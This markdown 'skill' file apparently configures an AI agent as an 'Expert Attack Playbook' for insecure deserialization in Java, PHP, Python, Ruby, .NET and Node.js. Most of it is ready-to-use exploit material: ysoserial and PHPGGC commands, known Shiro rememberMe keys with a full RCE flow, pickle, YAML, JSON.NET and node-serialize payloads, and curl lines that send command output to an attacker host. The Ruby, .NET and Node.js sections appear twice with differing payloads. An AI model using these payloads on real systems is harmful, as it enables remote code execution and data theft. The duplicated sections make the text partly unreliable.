---
name: deserialization-insecure
description: >-
  Insecure deserialization playbook. Use when Java, PHP, or Python applications deserialize untrusted data via ObjectInputStream, unserialize, pickle, or similar mechanisms that may lead to RCE, file access, or privilege escalation.
---

# SKILL: Insecure Deserialization — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert deserialization techniques across Java, PHP, and Python. Covers gadget chain selection, traffic fingerprinting, tool usage (ysoserial, PHPGGC), Shiro/WebLogic/Commons Collections specifics, Phar deserialization, and Python pickle abuse. Base models often miss the distinction between finding the sink and finding a usable gadget chain.

## 0. RELATED ROUTING

- [jndi-injection](../jndi-injection/SKILL.md) when deserialization leads to JNDI lookup (e.g., post-JDK 8u191 bypass via LDAP → deserialization)
- [unauthorized-access-common-services](../unauthorized-access-common-services/SKILL.md) when the deserialization endpoint is an exposed management service (RMI Registry, T3, AJP)
- [ghost-bits-cast-attack](../ghost-bits-cast-attack/SKILL.md) when a WAF blocks your BCEL ClassLoader or Fastjson `@type` payload — Ghost Bits wraps each bytecode byte in a Unicode char whose low 8 bits match, yielding a payload the WAF cannot fingerprint

### Advanced Reference

Also load [JAVA_GADGET_CHAINS.md](./JAVA_GADGET_CHAINS.md) when you need:
- Java gadget chain version compatibility matrix (CommonsCollections 1–7, CommonsBeanutils, Spring, JDK-only, Groovy, Hibernate, ROME, C3P0, etc.)
- SnakeYAML gadget (ScriptEngineManager/URLClassLoader) with exploit JAR structure
- Hessian/Kryo/Avro/XStream deserialization patterns and traffic fingerprints
- .NET ViewState deserialization (machineKey requirement, ViewState forgery with ysoserial.net, Blacklist3r)
- Ruby YAML.load vs YAML.safe_load exploitation with version-specific chains
- Detection fingerprints: magic bytes table by format (Java `AC ED`, .NET `AAEAAD`, Python pickle `80 0N`, PHP `O:`, Ruby `04 08`)

---

## 1. TRAFFIC FINGERPRINTING — IS IT DESERIALIZATION?

### Java Serialized Objects

| Indicator | Where to Look |
|---|---|
| Hex `ac ed 00 05` | Raw binary in request/response body, cookies, POST params |
| Base64 `rO0AB` | Cookies (`rememberMe`), hidden form fields, JWT claims |
| `Content-Type: application/x-java-serialized-object` | HTTP headers |
| T3/IIOP protocol traffic | WebLogic ports (7001, 7002) |

### PHP Serialized Objects

| Indicator | Where to Look |
|---|---|
| `O:NUMBER:"ClassName"` pattern | POST body, cookies, session files |
| `a:NUMBER:{` (array) | Same locations |
| `phar://` URI usage | File operations accepting user-controlled paths |

### Python Pickle

| Indicator | Where to Look |
|---|---|
| Hex `80 03` or `80 04` (protocol 3/4) | Binary data in requests, message queues |
| Base64-encoded binary blob | API params, cookies, Redis values |
| `pickle.loads` / `pickle.load` in source | Code review / whitebox |

---

## 2. JAVA — GADGET CHAINS AND TOOLS

### ysoserial — Primary Tool

```bash
# Generate payload (example: CommonsCollections1 chain with command)
java -jar ysoserial.jar CommonsCollections1 "curl http://ATTACKER/pwned" > payload.bin

# Base64-encode for HTTP transport
java -jar ysoserial.jar CommonsCollections1 "id" | base64 -w0

# Common chains to try (ordered by frequency of vulnerable dependency):
# CommonsCollections1-7  — Apache Commons Collections 3.x / 4.x
# Spring1, Spring2       — Spring Framework
# Groovy1               — Groovy
# Hibernate1            — Hibernate
# JBossInterceptors1    — JBoss
# Jdk7u21               — JDK 7u21 (no extra dependency)
# URLDNS                — DNS-only confirmation (no RCE, works everywhere)
```

### URLDNS — Safe Confirmation Probe

URLDNS triggers a DNS lookup without RCE — safe for confirming deserialization without damage:

```bash
java -jar ysoserial.jar URLDNS "http://UNIQUE_TOKEN.burpcollaborator.net" > probe.bin
```

DNS hit on collaborator = confirmed deserialization. Then escalate to RCE chains.

### Commons Collections — The Classic Chain

The vulnerability exists when `org.apache.commons.collections` (3.x) is on the classpath and the application calls `readObject()` on untrusted data.

Key classes in the chain: `InvokerTransformer` → `ChainedTransformer` → `TransformedMap` → triggers `Runtime.exec()` during deserialization.

### Apache Shiro — rememberMe Deserialization

Shiro uses AES-CBC to encrypt serialized Java objects in the `rememberMe` cookie.

```text
Known hard-coded keys (SHIRO-550 / CVE-2016-4437):
kPH+bIxk5D2deZiIxcaaaA==          # most common default
wGJlpLanyXlVB1LUUWolBg==          # another common default in older versions
4AvVhmFLUs0KTA3Kprsdag==
Z3VucwAAAAAAAAAAAAAAAA==
```

**Attack flow**:
1. Detect: response sets `rememberMe=deleteMe` cookie on invalid session
2. Generate ysoserial payload (CommonsCollections6 recommended for broad compat)
3. AES-CBC encrypt with known key + random IV
4. Base64-encode → set as `rememberMe` cookie value
5. Send request → server decrypts → deserializes → RCE

**DNSLog confirmation** (before full RCE): use URLDNS chain → `java -jar ysoserial.jar URLDNS "http://xxx.dnslog.cn"` → encrypt → set cookie → check DNSLog for hit.

**Post-fix (random key)**: Key may still leak via padding oracle, or another CVE (SHIRO-721).

### WebLogic Deserialization

Multiple vectors:
- **T3 protocol** (port 7001): direct serialized object injection
- **XMLDecoder** (CVE-2017-10271): XML-based deserialization via `/wls-wsat/CoordinatorPortType`
- **IIOP protocol**: alternative to T3

```bash
# T3 probe — check if T3 is exposed:
nmap -sV -p 7001 TARGET
# Look for: "T3" or "WebLogic" in service banner
```

### Java RMI Registry

RMI Registry (port 1099) accepts serialized objects by design:

```bash
# ysoserial exploit module for RMI:
java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit TARGET 1099 CommonsCollections1 "id"

# Requires: vulnerable library on target's classpath
# Works on: JDK <= 8u111 without JEP 290 deserialization filter
```

### JDK Version Constraints

| JDK Version | Impact |
|---|---|
| < 8u121 | RMI/LDAP remote class loading works |
| 8u121-8u190 | `trustURLCodebase=false` for RMI; LDAP still works |
| >= 8u191 | Both RMI and LDAP remote class loading blocked |
| >= 8u191 bypass | Use LDAP → return serialized gadget object (not remote class) |

---

## 3. PHP — unserialize AND PHAR

### Magic Method Chain

PHP deserialization triggers magic methods in order:

```
__wakeup()  → called immediately on unserialize()
__destruct() → called when object is garbage-collected
__toString() → called when object is used as string
__call()     → called for inaccessible methods
```

**Attack**: craft a serialized object whose `__destruct()` or `__wakeup()` triggers dangerous operations (file write, SQL query, command execution, SSRF).

### Serialized Object Format

```php
O:8:"ClassName":2:{s:4:"prop";s:5:"value";s:4:"cmd";s:2:"id";}
// O:LENGTH:"CLASS":PROP_COUNT:{PROPERTIES}
```

### phpMyAdmin Configuration Injection (Real-World Case)

phpMyAdmin `PMA_Config` class reads arbitrary files via `source` property:

```text
action=test&configuration=O:10:"PMA_Config":1:{s:6:"source";s:11:"/etc/passwd";}
```

### PHPGGC — PHP Gadget Chain Generator

```bash
# List available chains:
phpggc -l

# Generate payload (example: Laravel RCE):
phpggc Laravel/RCE1 system id

# Common chains:
# Laravel/RCE1-10
# Symfony/RCE1-4
# Guzzle/RCE1
# Monolog/RCE1-2
# WordPress/RCE1
# Slim/RCE1
```

### Phar Deserialization

Phar archives contain serialized metadata. Any file operation on a `phar://` URI triggers deserialization — even when `unserialize()` is never directly called.

**Triggering functions** (partial list):
```
file_exists()    file_get_contents()    fopen()
is_file()        is_dir()               copy()
filesize()       filetype()             stat()
include()        require()              getimagesize()
```

**Attack flow**:
1. Upload a valid file (e.g., JPEG with phar polyglot)
2. Trigger file operation: `file_exists("phar://uploads/avatar.jpg")`
3. PHP deserializes phar metadata → gadget chain executes

```bash
# Generate phar with PHPGGC:
phpggc -p phar -o exploit.phar Monolog/RCE1 system id
```

---

## 4. PYTHON — PICKLE

### __reduce__ Method

Python's `pickle.loads()` calls `__reduce__()` on objects during deserialization, which can return a callable + args:

```python
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ("id",))

payload = pickle.dumps(Exploit())
# Send payload to target that calls pickle.loads()
```

### Analyzing Pickle Opcodes

```python
import pickletools
pickletools.dis(payload)
# Shows opcodes: GLOBAL, REDUCE, etc.
# Look for GLOBAL referencing dangerous modules (os, subprocess, builtins)
```

### Common Python Deserialization Sinks

```python
pickle.loads(user_data)
pickle.load(file_handle)
yaml.load(data)           # PyYAML without Loader=SafeLoader
jsonpickle.decode(data)
shelve.open(path)
```

### Defensive Bypass: RestrictedUnpickler

Even when `RestrictedUnpickler.find_class` is used, check if the whitelist is too broad:

```python
class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if module == "builtins" and name in safe_builtins:
            return getattr(builtins, name)
        raise pickle.UnpicklingError(f"forbidden: {module}.{name}")
```

If `safe_builtins` includes `eval`, `exec`, or `__import__` → still exploitable.

---

## 5. DETECTION METHODOLOGY

```
Found binary blob or encoded object in request/cookie?
├── Java signature (ac ed / rO0AB)?
│   ├── Use URLDNS probe for safe confirmation
│   ├── Identify libraries (error messages, known product)
│   └── Try ysoserial chains matching identified libraries
│
├── PHP signature (O:N:"...)?
│   ├── Identify framework (Laravel, Symfony, WordPress)
│   ├── Try PHPGGC chains for that framework
│   └── Check for phar:// wrapper in file operations
│
├── Python (opaque binary, base64 blob)?
│   ├── Try pickle payload with DNS callback
│   └── Check if PyYAML unsafe load is used
│
└── Not sure?
    ├── Try URLDNS payload (Java) — check DNS
    ├── Try PHP serialized test string
    └── Monitor error messages for class loading failures
```

---

## 6. DEFENSE AWARENESS

| Language | Mitigation |
|---|---|
| Java | JEP 290 deserialization filters; whitelist allowed classes; avoid `ObjectInputStream` on untrusted data; use JSON/Protobuf instead |
| PHP | Avoid `unserialize()` on user input; use `json_decode()` instead; block `phar://` in file operations |
| Python | Use `pickle` only for trusted data; use `json` for external input; PyYAML: always use `yaml.safe_load()` |

---

## 7. QUICK REFERENCE — KEY PAYLOADS

```text
# Java — URLDNS confirmation
java -jar ysoserial.jar URLDNS "http://TOKEN.collab.net"

# Java — RCE via CommonsCollections
java -jar ysoserial.jar CommonsCollections1 "curl http://ATTACKER/pwned"

# PHP — Laravel RCE
phpggc Laravel/RCE1 system "id"

# PHP — Phar polyglot
phpggc -p phar -o exploit.phar Monolog/RCE1 system "id"

# Python — Pickle RCE
python3 -c "import pickle,os;print(pickle.dumps(type('X',(),{'__reduce__':lambda s:(os.system,('id',))})()).hex())"

# Shiro default key test
rememberMe=<AES-CBC(key=kPH+bIxk5D2deZiIxcaaaA==, payload=ysoserial_output)>
```

---

## 8. RUBY DESERIALIZATION

### Ruby Marshal

- `Marshal.load` on untrusted data → RCE
- Fingerprint: binary data, no common text header
- Gadget chains exist for various Ruby versions
- Docker verification: hex payload via `[hex_string].pack("H*")`

### Ruby YAML (YAML.load)

- `YAML.load` (not `YAML.safe_load`) executes arbitrary Ruby objects
- **Pre Ruby 2.7.2**: `Gem::Requirement` chain → `git_set: id` / `git_set: sleep 600`
- **Ruby 2.x-3.x**: `Gem::Installer` → `TarReader` → `Kernel#system` chain (longer, multi-step)
- Always test: `YAML.load("--- !ruby/object:Gem::Installer\ni: x")` for class instantiation check
- Payload template:

```yaml
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::DependencyList
  type: :runtime
  specs:
    - !ruby/object:Gem::StubSpecification
      loaded_from: "|id"
```

- Note: `YAML.safe_load` is safe (Ruby 2.1+); `Psych.safe_load` also safe

---

## 9. .NET DESERIALIZATION

- **Traffic fingerprint**:
  - BinaryFormatter: hex `AAEAAD` (base64 `AAEAAAD/////`)
  - ViewState: hex `FF01` or `/w` prefix
  - JSON.NET: `$type` property in JSON
- **BinaryFormatter** (most dangerous, deprecated in .NET 5+): arbitrary type instantiation
- **XmlSerializer**: `ObjectDataProvider` + `XamlReader` chain for command execution

  ```xml
  <root xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:od="http://schemas.microsoft.com/powershell/2004/04" type="System.Windows.Data.ObjectDataProvider">
    <od:MethodName>Start</od:MethodName>
    <od:MethodParameters><sys:String>cmd</sys:String><sys:String>/c calc</sys:String></od:MethodParameters>
    <od:ObjectInstance xsi:type="System.Diagnostics.Process"/>
  </root>
  ```

- **NetDataContractSerializer**: similar to BinaryFormatter, full type info in XML
- **LosFormatter**: used in ViewState, deserializes to `ObjectStateFormatter`
- **JSON.NET**: `$type` property enables type control → `ObjectDataProvider` + `ExpandedWrapper` chains

  ```json
  {"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","MethodParameters":{"$type":"System.Collections.ArrayList","$values":["cmd","/c calc"]},"ObjectInstance":{"$type":"System.Diagnostics.Process, System"}}
  ```

- **Tool**: `ysoserial.net` — generate payloads for all .NET formatters

  ```text
  ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "calc" -o base64
  ysoserial.exe -f Json.Net -g ObjectDataProvider -c "calc"
  ```

- **POP gadgets**: `ObjectDataProvider`, `ExpandedWrapper`, `AssemblyInstaller.set_Path`

---

## 10. NODE.JS DESERIALIZATION

- **node-serialize**: `unserialize()` with IIFE (Immediately Invoked Function Expression)
  - Payload marker: `_$$ND_FUNC$$_`
  - Add `()` at end to auto-execute:

  ```json
  {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('COMMAND')}()"}
  ```

- **funcster**: `__js_function` property → `constructor.constructor` to access `process`

  ```json
  {"__js_function":"function(){return global.process.mainModule.require('child_process').execSync('id').toString()}"}
  ```

- **cryo**: similar to funcster, serializes JS objects with function support

---

## RUBY DESERIALIZATION

### Marshal (Binary Format)
```ruby
# Ruby's Marshal.load is equivalent to Java's ObjectInputStream
# Any class with marshal_dump/marshal_load can be a gadget

# Detection: binary data starting with \x04\x08
# Or hex: 0408

# PoC gadget (requires vulnerable class in scope):
payload = "\x04\x08..." # hex-encoded gadget chain
Marshal.load(payload)    # triggers arbitrary code execution
```

### YAML.load (Critical — Most Common Ruby Deser Sink)
```ruby
# YAML.load (NOT YAML.safe_load) deserializes arbitrary Ruby objects

# Ruby <= 2.7.2 — Gem::Requirement chain:
# Triggers via !ruby/object constructor
---
!ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::DependencyList
  specs:
    - !ruby/object:Gem::Source
      current_fetch_uri: !ruby/object:URI::Generic
        path: "| id"

# Ruby 2.x–3.x — Gem::Installer chain:
# Uses Gem::Installer → Gem::StubSpecification → Kernel#system
---
!ruby/hash:Gem::Installer
i: x
!ruby/hash:Gem::SpecFetcher
i: y
!ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::Package::TarReader
  io: &1 !ruby/object:Net::BufferedIO
    io: &1 !ruby/object:Gem::Package::TarReader::Entry
      read: 0
      header: "abc"
    debug_output: &1 !ruby/object:Net::WriteAdapter
      socket: &1 !ruby/object:Gem::RequestSet
        sets: !ruby/object:Net::WriteAdapter
          socket: !ruby/module 'Kernel'
          method_id: :system
        git_set: id    # <-- command to execute
      method_id: :resolve

# Safe alternative: YAML.safe_load (whitelist of allowed types)
```

### Tools
- `elttam/ruby-deserialization` — Ruby gadget chain generator
- `frohoff/ysoserial` inspiration → check Ruby-specific forks

---

## .NET DESERIALIZATION

### Traffic Fingerprinting

| Indicator | Serializer |
|---|---|
| Hex `00 01 00 00 00` / Base64 `AAEAAD` | BinaryFormatter |
| Hex `FF 01` / Base64 `/w` | DataContractSerializer |
| ViewState starts with `__VIEWSTATE` | LosFormatter / ObjectStateFormatter |
| JSON with `$type` property | JSON.NET (Newtonsoft) TypeNameHandling |
| XML with `<ObjectDataProvider>` | XmlSerializer / NetDataContractSerializer |

### BinaryFormatter / LosFormatter
```
# Most dangerous — arbitrary type instantiation
# Tool: ysoserial.net

ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "calc.exe" -o base64
ysoserial.exe -g TextFormattingRunProperties -f BinaryFormatter -c "cmd /c whoami > C:\\out.txt" -o base64

# LosFormatter wraps BinaryFormatter — same gadgets work
ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c "calc.exe" -o base64
```

### XmlSerializer + ObjectDataProvider
```xml
<root>
  <ObjectDataProvider MethodName="Start" xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation">
    <ObjectDataProvider.MethodParameters>
      <sys:String xmlns:sys="clr-namespace:System;assembly=mscorlib">cmd.exe</sys:String>
      <sys:String xmlns:sys="clr-namespace:System;assembly=mscorlib">/c whoami</sys:String>
    </ObjectDataProvider.MethodParameters>
    <ObjectDataProvider.ObjectInstance>
      <ProcessStartInfo xmlns="clr-namespace:System.Diagnostics;assembly=System">
        <ProcessStartInfo.FileName>cmd.exe</ProcessStartInfo.FileName>
        <ProcessStartInfo.Arguments>/c whoami</ProcessStartInfo.Arguments>
      </ProcessStartInfo>
    </ObjectDataProvider.ObjectInstance>
  </ObjectDataProvider>
</root>
```

### JSON.NET with TypeNameHandling
```json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "MethodName": "Start",
  "MethodParameters": {
    "$type": "System.Collections.ArrayList, mscorlib",
    "$values": ["cmd.exe", "/c whoami"]
  },
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System"
  }
}
```
Vulnerable when `TypeNameHandling` is set to `Auto`, `Objects`, `Arrays`, or `All`.

### Tools
- `pwntester/ysoserial.net` — primary .NET deserialization payload generator
- Gadget chains: TypeConfuseDelegate, TextFormattingRunProperties, PSObject, ActivitySurrogateSelectorFromFile

---

## NODE.JS DESERIALIZATION

### node-serialize (IIFE Pattern)
```javascript
// node-serialize uses eval() internally
// Payload uses _$$ND_FUNC$$_ marker + IIFE:

var payload = '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\',function(error,stdout,stderr){console.log(stdout)});}()"}';

// The trailing () makes it an Immediately Invoked Function Expression
// When unserialize() processes this, it executes the function

// Full HTTP exploit (in cookie or body):
{"username":"_$$ND_FUNC$$_function(){require('child_process').exec('curl http://ATTACKER/?x=$(id|base64)',function(e,o,s){});}()","email":"test@test.com"}
```

### funcster
```javascript
// funcster deserializes functions via constructor.constructor pattern:
{"__js_function":"function(){var net=this.constructor.constructor('return require')()('child_process');return net.execSync('id').toString();}"}
```

### PHP create_function + Deserialization Combo
```php
// When a PHP class uses create_function in __destruct or __wakeup:
// Serialize an object where:
$a = "create_function";
$b = ";}system('id');/*";
// The lambda body becomes: function(){ ;}system('id');/* }
// Closing the original function body and injecting a command

// In serialized form, private properties need \0ClassName\0 prefix:
O:7:"Noteasy":2:{s:19:"\0Noteasy\0method_name";s:15:"create_function";s:14:"\0Noteasy\0args";s:21:";}system('id');/*";}
```

---

## 11. RUBY DESERIALIZATION

### Marshal
```ruby
# Ruby's native serialization. Dangerous when deserializing untrusted data.
# Detection: Binary data starting with \x04\x08

# One-liner gadget verification (hex-encoded payload):
payload = ["040802"].pack("H*")  # Minimal Marshal header
Marshal.load(payload)
```

### YAML (CVE-rich surface)
```ruby
# YAML.load is DANGEROUS — equivalent to eval for Ruby objects
# Safe alternative: YAML.safe_load

# Ruby <= 2.7.2: Gem::Requirement chain
--- !ruby/object:Gem::Requirement
requirements:
  - !ruby/object:Gem::DependencyList
    specs:
    - !ruby/object:Gem::Source
      uri: "| id"

# Ruby 2.x-3.x: Gem::Installer chain (more complex)
# Triggers: git_set → Kernel#system
--- !ruby/object:Gem::Installer
i: x
# (Full chain available in ysoserial-ruby / blind-ruby-deserialization)

# Universal detection: supply YAML that triggers DNS callback
--- !ruby/object:Gem::Fetcher
uri: http://BURP_COLLAB/
```

**Tools**: `elttam/ruby-deserialization`, `mbechler/ysoserial` (Ruby variant)

---

## 12. .NET DESERIALIZATION

### Fingerprinting
| Magic Bytes | Format |
|---|---|
| `AAEAAD` (base64) / `00 01 00 00 00` (hex) | BinaryFormatter |
| `FF 01` or `/w` (base64) | ViewState (ObjectStateFormatter) |
| `<` (XML opening) | XmlSerializer / DataContractSerializer |
| JSON with `$type` key | JSON.NET (TypeNameHandling enabled) |

### BinaryFormatter (most dangerous)
```
# Always dangerous when deserializing untrusted data
# Tool: ysoserial.net
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "whoami" -o base64
ysoserial.exe -f BinaryFormatter -g WindowsIdentity -c "calc" -o raw
```

### ViewState (ASP.NET)
```
# If __VIEWSTATE is not MAC-protected (enableViewStateMac=false):
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c whoami" --validationalg="SHA1" --validationkey="KNOWN_KEY"

# Leak machineKey from web.config (via LFI/backup) → forge ViewState
```

### XmlSerializer + ObjectDataProvider
```xml
<root xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
      xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <ObjectDataProvider MethodName="Start">
    <ObjectInstance xsi:type="Process">
      <StartInfo>
        <FileName>cmd.exe</FileName>
        <Arguments>/c whoami</Arguments>
      </StartInfo>
    </ObjectInstance>
  </ObjectDataProvider>
</root>
```

### JSON.NET ($type abuse)
```json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "MethodName": "Start",
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System",
    "StartInfo": {
      "$type": "System.Diagnostics.ProcessStartInfo, System",
      "FileName": "cmd.exe",
      "Arguments": "/c whoami"
    }
  }
}
```
Vulnerable when `TypeNameHandling != None` in JSON deserialization settings.

### Tools
- `pwntester/ysoserial.net` — primary .NET gadget chain generator
- `NotSoSecure/Blacklist3r` — decrypt/forge ViewState with known machineKey

---

## 13. NODE.JS DESERIALIZATION

### node-serialize (IIFE injection)
```javascript
// Vulnerable pattern:
var serialize = require('node-serialize');
var obj = serialize.unserialize(userInput);

// Payload: IIFE (Immediately Invoked Function Expression)
// The _$$ND_FUNC$$_ prefix signals a serialized function
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id',function(error,stdout,stderr){console.log(stdout)})}()"}

// Key: the () at the end causes immediate execution upon deserialization
```

### funcster
```javascript
// Vulnerable: funcster.deepDeserialize(userInput)
// Payload uses __js_function to inject via constructor chain:
{"__js_function":"function(){var net=this.constructor.constructor('return this')().process.mainModule.require('child_process');return net.execSync('id').toString()}()"}
```

### PHP create_function + Deserialization Combo
```php
// When create_function is available and object is deserialized:
// Payload creates lambda with injected code:
$a = "create_function";
$b = ";}system('id');/*";
// The lambda body becomes: function anonymous() { ;}system('id');/* }
// Effective: close original body, inject command, comment out rest

// In serialized form (with private property \0ClassName\0):
O:8:"ClassName":2:{s:13:"\0ClassName\0func";s:15:"create_function";s:12:"\0ClassName\0arg";s:18:";}system('id');/*";}
```
